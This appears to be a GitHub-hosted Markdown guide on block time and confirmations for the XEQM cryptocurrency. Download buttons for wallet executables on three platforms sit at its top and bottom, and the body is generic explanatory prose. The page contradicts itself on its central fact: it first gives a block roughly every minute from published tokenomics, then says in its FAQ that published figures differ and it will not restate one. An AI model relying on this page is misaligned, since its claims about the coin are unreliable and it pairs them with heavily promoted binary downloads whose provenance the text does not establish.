![XEQM WALLET](assets/banner-article.png)

# XEQM block time and confirmations

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

XEQM produces a block roughly every minute according to the project's published tokenomics, and a transaction is treated as settled once it is included in a block and further blocks build on it. How many confirmations count as enough is a policy decision made by whoever is accepting the payment, not a rule the wallet enforces.

## What a block is

A block is a bundle of transactions plus the record that ties it to the one before. Producing one is what moves the chain forward, and it is the only way a transaction becomes part of the permanent record.

Until a block includes your transaction, it is broadcast and waiting. That is the state the wallet shows as pending. [XEQM transaction still pending](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-transaction-still-pending.md) covers what to do with it.

## Why the interval matters

A shorter interval means a payment is included sooner and confirmations accumulate faster. It also means more blocks per day, each with its own reward, and more chances for a node to miss its window.

Interval is a design parameter with consequences for the reward schedule and for how quickly a recipient can feel confident. It is not a speed setting a user can change.

## What a confirmation is

Every block after the one that included your transaction adds one. A transaction in the newest block has a single confirmation; one buried under several blocks has several.

The count is what wallets and services display, and it is a measure of how deeply the transaction is embedded rather than of whether it happened.

## How many you need

That depends on the counterparty. An exchange releasing a withdrawal, a merchant releasing goods and a friend accepting a transfer can each set their own threshold, and none of them needs the network's permission.

The wallet shows the count; it does not impose a number. If a service says it needs more before crediting a deposit, that is their policy and waiting is the only response. [How to receive XEQM](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-receive-xeqm.md) covers the receiving side.

## Why services wait at all

Because a very recent block can be replaced if the chain reorganises. Waiting for more blocks makes that vanishingly unlikely, and the cost is time rather than risk.

The trade is the service's to make. A coffee shop and a currency exchange will not choose the same number, and there is no correct answer that applies to both.

## What a reorganisation would look like

If two blocks were produced at the same height, the network would settle on one chain and the other would be orphaned. A transaction in the losing block would return to pending and could be included again.

That is a normal property of blockchains and it is why confirmations exist. It is also why a single confirmation is described as recent rather than settled.

## Why the interval is not a promise

A block every minute is a target rather than a promise. Blocks can arrive in a burst or a gap, and a payment that lands in a quiet period waits a little longer for its first confirmation.

That variance is why services set thresholds rather than trusting a single block. The schedule is regular in aggregate and uneven in the moment.

## What a confirmation count does not tell you

It does not tell you the payment was correct, that the amount was right, or that the recipient credited it. It tells you how deeply the transaction sits in the chain.

Those are different questions, and confusing them is how people conclude a payment failed when the only problem was a wrong address. [Can I cancel an XEQM transaction](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-cancel-an-xeqm-transaction.md) covers the irreversible part.

## How to watch it arrive

The wallet's history shows the state and the count, updating as it reads blocks. There is nothing to press and nothing to poll.

If the count is not moving, compare the sync indicator with the clock before assuming the network has stopped.

## What the wallet displays

The history shows each transaction with its state, and the count rises as blocks arrive. Nothing needs to be refreshed manually; the wallet reads the chain and updates.

A wallet that is behind shows a stale count, which is the only common reason a number looks wrong. [XEQM WALLET not syncing](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-not-syncing-fix.md) covers the fix.

## What to tell somebody who is waiting

Give them the transaction identifier and the count you can see. If their threshold is higher than yours, the difference is policy rather than a discrepancy.

That conversation is much shorter than the argument about whether the payment happened, which the identifier settles immediately.

## Does the fee change the speed

No. The fee scales with the transaction's size rather than with a bid for priority, and the wallet computes it for the transaction it builds.

So paying more does not buy an earlier block, and paying less does not delay one beyond the ordinary wait. [What XEQM network fees cost](https://github.com/XEQMFoundation/account-guide/blob/main/what-are-xeqm-network-fees.md) covers the mechanics.

## What about a transaction that never confirms

That is a different question from speed. It usually means the wallet was reading a stale view, or the transaction was never accepted, and the diagnostic is the same either way: check the sync state and the node.

A current build validates what a remote node returns before building a transaction, which removes one cause of a phantom pending entry.

## How to explain it in one sentence

Blocks arrive on the schedule consensus sets, each one after the first adds a confirmation, and how many are enough is the recipient's decision rather than the network's.

That sentence answers almost every question this page receives. [Verify an XEQM transaction proof](https://github.com/XEQMFoundation/account-guide/blob/main/verify-xeqm-transaction-proof.md) covers proving the payment while the count is still low.

## What to do while a confirmation count is low

Nothing, usually. The payment exists, the count rises, and intervening only adds risk: a second send is a second payment, and re-opening the wallet does not speed a block.

The useful action is to tell the recipient the current count and let them decide whether that meets their threshold.

## Why a test payment settles the argument

A small payment to a new address shows you the whole path  -  broadcast, inclusion, confirmations, and the recipient's own view  -  for a fraction of a cent.

After that, the numbers on this page stop being abstract. You know how long it felt and how many confirmations arrived while you watched.

## What an explorer adds

An explorer shows the block a transaction landed in and how many blocks have followed. That is the same information the wallet reports, presented on a page you do not control.

Useful when you want a second view; unnecessary when the wallet is synced. Either way the count is the count.

## The summary

Blocks arrive on a steady schedule, confirmations accumulate from there, and thresholds belong to the counterparty. The wallet shows the state and does not decide for you.

If a payment looks stuck rather than merely recent, the problem is your view of the chain rather than the chain.

## Frequently asked questions

### How long is an XEQM block?

The project's published material gives differing figures, so this site does not restate one. What matters for a payment is that blocks keep arriving and confirmations keep accumulating.

### How many confirmations are enough?

Whatever the recipient requires. The wallet shows the count; it does not set a threshold.

### Does a higher fee confirm faster?

No. The fee follows transaction size rather than priority.

### Why does my transaction show one confirmation for so long?

Either the wallet has not read the next blocks, or the network has not produced them yet. Check the sync indicator first.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [How to receive XEQM](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-receive-xeqm.md)
- [How to send XEQM](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-send-xeqm.md)
- [XEQM transaction still pending](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-transaction-still-pending.md)
